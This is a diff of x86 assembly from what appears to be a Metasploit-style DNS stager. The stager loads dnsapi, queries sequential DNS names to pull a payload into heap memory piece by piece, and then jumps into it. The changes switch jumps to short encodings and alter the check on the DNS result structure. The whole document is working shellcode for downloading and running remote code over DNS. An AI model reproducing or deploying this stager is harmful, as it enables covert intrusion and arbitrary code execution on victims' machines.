@@ -160,7 +160,7 @@ get_next_mod1:           ;
 	pop edi                ; Pop off the current (now the previous) modules hash
 	pop edx                ; Restore our position in the module list
 	mov edx, [edx]         ; Get the next module
-	jmp next_mod           ; Process this module
+	jmp.i8 next_mod        ; Process this module
 
 ; actual routine
 start:
@@ -195,7 +195,7 @@ load_dnsapi:
 	mov bl,0x61		; first query, start with 'a'
 
 dnsquery:
-	jmp get_dnsname		; get dnsname
+	jmp.i8 get_dnsname	; get dnsname
 
 get_dnsname_return:
 	pop eax			; get ptr to dnsname (lpstrName)
@@ -215,7 +215,7 @@ get_dnsname_return:
 	call ebp		;
 	test eax, eax		; query ok ?
 	jnz jump_to_payload	; no, jump to payload
-	jmp get_query_result	; eax = 0 : a piece returned, fetch it
+	jmp.i8 get_query_result	; eax = 0 : a piece returned, fetch it
 
 
 get_dnsname:
@@ -225,9 +225,9 @@ get_dnsname:
 get_query_result:
 	xchg #{bufferreg},edx	; save start of heap
 	pop #{bufferreg}	; heap structure containing DNS results
-	mov eax,[#{bufferreg}]	; if first dword has a non-null value, then stop
-	test eax,eax
-	jnz prepare_payload	; jmp to payload
+	mov eax,[#{bufferreg}+0x18]	; check if value at offset 0x18 is 0x1
+	cmp eax,1
+	jne prepare_payload	; jmp to payload
 	add #{bufferreg},#{wTypeOffset}	; get ptr to ptr to DNS reply
 	mov #{bufferreg},[#{bufferreg}] ; get ptr to DNS reply
 
@@ -243,7 +243,7 @@ copy_piece_to_heap:
 	push edi		;
 	inc ebx			; increment sequence
 	xchg #{bufferreg},edx	; restore start of heap
-	jmp dnsquery	; try to get the next piece, if any
+	jmp.i8 dnsquery	        ; try to get the next piece, if any
 
 prepare_payload:
 	mov #{bufferreg},edx
